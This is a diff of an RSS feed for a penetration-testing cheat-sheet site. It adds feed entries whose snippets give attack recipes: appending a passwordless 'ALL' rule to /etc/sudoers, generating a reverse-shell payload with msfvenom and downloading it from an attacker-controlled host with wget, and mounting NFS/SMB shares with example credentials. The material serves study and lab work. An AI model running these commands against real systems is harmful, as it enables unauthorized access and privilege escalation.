@@ -57,11 +57,25 @@
       <description>Abuse #1: Install a Malicious Driver 1. Compile eoploaddriver +---------------------------------------------------------------------------------------+ | 1. Open Visual Studio 2022 | | 2. Create a new project | | 3. Project Template : C++ Console App | | 4. Project Name : Eoploaddriver | | 5. Replace code : eoploaddriver.cpp | | 6. Remove header : `include &amp;#34;stdafx.h&amp;#34;` | | 7. Release -&amp;gt; x64 | | 8. Build -&amp;gt; Build Solution | | 9. Exported to C:\Users\user\source\repos\Eoploaddriver\x64\Release\Eoploaddriver.</description>
     </item>
     <item>
+      <title>Share Mount</title>
+      <link>https://tldrbins.github.io/share_mount/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/share_mount/</guid>
+      <description>NFS SMB List Shares showmount -e &amp;lt;TARGET&amp;gt; $ showmount -e 10.10.11.191 Export list for 10.10.11.191: /home/ross * /var/www/html * Mount Share sudo mkdir /mnt/share $ sudo mkdir /mnt/share sudo mount -t nfs &amp;lt;TARGET&amp;gt;:&amp;lt;SHARE&amp;gt; /mnt/share/ $ sudo mount -t nfs 10.10.11.191:/home/ross /mnt/share/ $ ls /mnt/share Desktop Documents Downloads Music Pictures Public Templates Videos Unmount Share sudo umount /mnt/share/ $ sudo umount /mnt/share/ Mount Share sudo mount -t cifs //&amp;lt;TARGET&amp;gt;/&amp;lt;SHARE&amp;gt; /mnt # Without creds sudo mount -t cifs -o user=,password= //&amp;lt;TARGET&amp;gt;/&amp;lt;SHARE&amp;gt; /mnt # With creds sudo mount -t cifs -o user=&amp;#39;&amp;lt;USER&amp;gt;&amp;#39;,pass=&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; //&amp;lt;TARGET&amp;gt;/&amp;lt;SHARE&amp;gt; /mnt $ sudo mount -t cifs -o ro,user=&amp;#39;localadmin&amp;#39;,password=&amp;#39;Secret123&amp;#39; //10.</description>
+    </item>
+    <item>
       <title>Sudoers</title>
       <link>https://tldrbins.github.io/sudoers/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/sudoers/</guid>
       <description>Abuse #1: Writable /etc/sudoers chmod 600 /etc/sudoers echo &amp;#39;&amp;lt;USER&amp;gt; ALL=(ALL) NOPASSWD: ALL&amp;#39; &amp;gt;&amp;gt; /etc/sudoers chmod 440 /etc/sudoers </description>
+    </item>
+    <item>
+      <title>WebDriver</title>
+      <link>https://tldrbins.github.io/webdriver/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/webdriver/</guid>
+      <description>Linux Privesc #1: RCE 1. Create a Payload msfvenom -p linux/x64/shell_reverse_tcp LHOST=&amp;lt;LOCAL_IP&amp;gt; LPORT=&amp;lt;LOCAL_PORT&amp;gt; -f elf &amp;gt; rev $ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.0.1 LPORT=1337 -f elf &amp;gt; rev [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 74 bytes Final size of elf file: 194 bytes 2. Upload to Target wget http://&amp;lt;LOCAL_IP&amp;gt;/rev -o /tmp/rev # Chmod chmod 755 /tmp/rev 3.</description>
     </item>
     <item>
       <title>Windows Services</title>
